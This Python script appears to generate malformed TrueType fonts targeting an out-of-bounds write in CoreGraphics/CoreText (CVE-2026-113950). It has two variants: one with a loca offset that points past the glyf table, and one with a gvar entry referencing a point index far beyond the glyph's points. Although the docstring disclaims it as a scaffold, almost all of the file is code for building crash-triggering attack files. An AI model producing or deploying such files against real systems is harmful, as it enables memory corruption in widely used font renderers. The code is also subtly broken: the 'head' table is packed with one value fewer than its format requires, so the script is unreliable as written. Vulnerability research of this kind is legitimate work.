#!/usr/bin/env python3
"""
gen_truetype_oob.py — SCAFFOLD, not an exploit.

Target : CVE-2026-113950 (CoreGraphics / CoreText font OOB write)
Theory : a TrueType variable font (gvar) or a malformed loca table causes a
         point-index / glyph-offset to be trusted, so the outline is written
         past its buffer.
Usage  : python3 gen_truetype_oob.py <loca|gvar> > evil.ttf
"""

import struct
import sys

def table(tag, data):
    tag = tag.encode("ascii").ljust(4, b"\0")[:4]
    return tag, data

def build_sfnt(tables):
    """Assemble a minimal sfnt container from (tag, data) pairs."""
    tags = sorted(tables, key=lambda t: t[0])
    num = len(tags)
    p2 = 1
    e = 0
    while p2 * 2 <= num:
        p2 *= 2
        e += 1
    search_range = p2 * 16
    entry_sel = e
    range_shift = num * 16 - search_range

    header = struct.pack(">IHHHH", 0x00010000, num, search_range,
                         entry_sel, range_shift)
    offset = len(header) + num * 16
    dir_entries = b""
    body = b""
    for tag, data in tags:
        pad = (4 - (len(data) % 4)) % 4
        dir_entries += struct.pack(">4sIII", tag, 0, offset, len(data))
        body += data + b"\0" * pad
        offset += len(data) + pad
    return header + dir_entries + body

def base_tables(num_glyphs=2):
    head = struct.pack(">IIIIHHQQhhhhHHhhh",
        0x00010000, 0x00010000, 0, 0x5F0F3CF5, 0, 1000,
        0, 0, 0, 0, 0, 1, 8, 2, 0, 0)
    maxp = struct.pack(">IH", 0x00010000, num_glyphs) + b"\0" * 26
    hhea = struct.pack(">IhhhHhhhhhhhhhhhH",
        0x00010000, 800, -200, 0, 1000, 0, 0, 1000, 1, 0, 0,
        0, 0, 0, 0, 0, num_glyphs)
    hmtx = struct.pack(">Hh", 1000, 0) + struct.pack(">Hh", 1000, 0)
    sub = struct.pack(">HHH", 0, 262, 0) + bytes(256)
    cmap = struct.pack(">HH", 0, 1) + struct.pack(">HHI", 3, 1, 12) + sub
    return {
        "head": head,
        "maxp": maxp,
        "hhea": hhea,
        "hmtx": hmtx,
        "cmap": cmap,
    }

def glyf_simple(points):
    n = max(points, 1)
    end_pts = [n - 1]
    body = struct.pack(">hhhhh", 0, 0, 0, 0, 0)
    body += struct.pack(">%dH" % len(end_pts), *end_pts)
    body += struct.pack(">H", 0)
    body += bytes([0x31]) * n
    body += bytes([10]) * n
    body += bytes([10]) * n
    return body

def variant_loca():
    """loca points past the end of glyf."""
    tables = base_tables(num_glyphs=2)
    g0 = glyf_simple(4)
    g1 = glyf_simple(4)
    glyf = g0 + g1
    bad_off = [0, len(g0), len(glyf) + 0x4000]
    loca = b"".join(struct.pack(">I", o) for o in bad_off)
    tables["glyf"] = glyf
    tables["loca"] = loca
    return build_sfnt(list(table(t, d) for t, d in tables.items()))

def variant_gvar():
    """A variable font whose gvar tuple references point index 1000."""
    tables = base_tables(num_glyphs=2)
    g0 = glyf_simple(4)
    g1 = glyf_simple(4)
    tables["glyf"] = g0 + g1
    tables["loca"] = struct.pack(">III", 0, len(g0), len(g0) + len(g1))

    axis = struct.pack(">4siiiHH", b"wght", 100 << 16, 400 << 16,
                       900 << 16, 0, 256)
    fvar = struct.pack(">HHHHHHH", 1, 0, 16, 2, 20, 1, 20) + axis

    gvar_header = struct.pack(">HHHHIHHI", 1, 0, 1, 1, 20, 0, 0, 0)
    glyph_data = struct.pack(">HH", 0x8001, 0)
    packed_points = bytes([1]) + struct.pack(">H", 1000)
    packed_deltas = bytes([0x01, 0x01])
    glyph_data += packed_points + packed_deltas
    offsets = [0, len(glyph_data)]
    gvar = gvar_header + b"".join(struct.pack(">I", o) for o in offsets)
    gvar += glyph_data
    tables["fvar"] = fvar
    tables["gvar"] = gvar
    return build_sfnt(list(table(t, d) for t, d in tables.items()))

def main():
    if len(sys.argv) != 2 or sys.argv[1] not in ("loca", "gvar"):
        sys.stderr.write(__doc__)
        return 2
    data = variant_loca() if sys.argv[1] == "loca" else variant_gvar()
    sys.stdout.buffer.write(data)
    return 0

if __name__ == "__main__":
    sys.exit(main())
